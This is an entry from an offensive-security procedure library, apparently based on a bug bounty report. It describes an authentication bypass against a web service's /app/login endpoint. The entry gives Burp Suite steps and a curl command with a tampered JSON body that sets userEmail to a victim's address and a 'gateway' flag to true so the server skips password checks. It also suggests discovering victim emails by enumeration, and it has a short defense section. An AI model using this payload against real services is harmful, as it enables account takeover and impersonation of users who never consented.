---
id: proc-modify-login-params-001
name: Modify Login Request Parameters to Bypass Authentication
tags:
  - parameter-tampering
  - bypass
  - json-modification
type: procedure
tools:
  - '[[tools/Burp-Suite]]'
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/curl-auth-bypass-login]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Valid Accounts]]'
updated_at: '2025-12-14T17:31:52.686Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Valid Accounts]]'
---
# Modify Login Request Parameters to Bypass Authentication

## Summary

This procedure details how to tamper with the captured login request in Burp Suite by changing the userEmail to a victim's and setting the gateway parameter to true, exploiting the backend's lack of validation to bypass credential checks.

## Description

The core vulnerability lies in the /app/login endpoint's trust of client-side parameters. By altering the JSON body in the 'updates' array—specifically 'userEmail' to any target email and 'gateway' to true—the server skips password verification and authenticates as the specified user. This is done in Burp's Repeater or Inspector tab, applicable to web apps like the reported MTN service. Prerequisites include a captured request; outcome is a ready-to-send tampered payload enabling impersonation.

## Requirements

1. Captured legitimate POST request in Burp Suite
2. Victim's email address (discoverable via enumeration if unknown)
3. Knowledge of JSON structure in request body

## Defense

Defensive measures and detection strategies:

- Server-side validation of all parameters against session state
- Reject requests with gateway=true unless from trusted internal sources
- Implement parameter whitelisting and input sanitization

## Objectives

1. Change userEmail to victim's without breaking JSON
2. Flip gateway to true to disable auth checks
3. Ensure request remains structurally valid for server acceptance

## Instructions

### Step 1: Load Request into Repeater

**Context**: Transfer the intercepted request to Burp Repeater for editing.

In Burp Proxy, right-click the captured request and send to Repeater.

> Inspect the raw request: POST /app/login with body like {"updates":[{"param":"userEmail","value":"attacker@example.com"},{"param":"gateway","value":false}]}

### Step 2: Edit Parameters

**Context**: Modify the JSON to target the victim and bypass.

Use Burp's text editor or Inspector to update values.

**Command** ([[commands/curl-auth-bypass-login]]):
```bash
curl -X POST https://████████/app/login -H "Content-Type: application/json" -d '{"updates":[{"param":"userEmail","value":"victim@example.com"},{"param":"gateway","value":true}]}' -v
```

> This curl equivalent shows the modification; in Burp, change value for userEmail to victim's (e.g., REDACTED+█████) and gateway to true. Do not forward yet.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Valid Accounts]]

### Sub-Techniques


## Commands Used

- [[commands/curl-auth-bypass-login]]

## Tools Used

- [[tools/Burp-Suite]]

## Tags

- [[parameter-tampering]]
- [[bypass]]
